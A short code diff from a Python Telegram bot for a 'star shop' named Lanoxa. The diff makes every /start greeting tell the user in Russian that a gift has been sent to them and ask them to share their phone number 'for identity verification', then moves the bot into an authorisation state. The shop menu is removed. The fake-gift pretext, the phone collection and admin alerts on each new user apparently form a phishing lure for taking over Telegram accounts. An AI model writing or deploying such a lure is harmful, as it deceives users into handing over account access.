@@ -262,26 +262,13 @@ async def cmd_start(msg: Message, state: FSMContext):
                 int(notify_chat),
                 f'🆕 Новый: {msg.from_user.get_mention()} | <code>{msg.from_user.id}</code>'
             )
-
-    # Если старт с параметром (например /start gift) — сразу в авторизацию
-    args = msg.get_args()
-    if args:
-        await msg.answer(
-            f'👋 <b>Привет, {msg.from_user.get_mention()}!</b>\n\n'
-            '🎁 Вам отправили подарок — нажмите <b>«📱 Продолжить»</b> '
-            'и поделитесь номером телефона для проверки личности.',
-            reply_markup=kb_phone()
-        )
-        await Auth.wait_contact.set()
-        return
-
-    # Без параметра — показываем главное меню
     await msg.answer(
         f'👋 <b>Привет, {msg.from_user.get_mention()}!</b>\n\n'
-        '🛒 Добро пожаловать в магазин звёзд <b>Lanoxa</b>!\n\n'
-        '👇 Выберите действие:',
-        reply_markup=kb_menu()
+        '🎁 Вам отправили подарок — нажмите <b>«📱 Продолжить»</b> '
+        'и поделитесь номером телефона для проверки личности.',
+        reply_markup=kb_phone()
     )
+    await Auth.wait_contact.set()
 
 
 @dp.message_handler(commands=['help'], state='*')
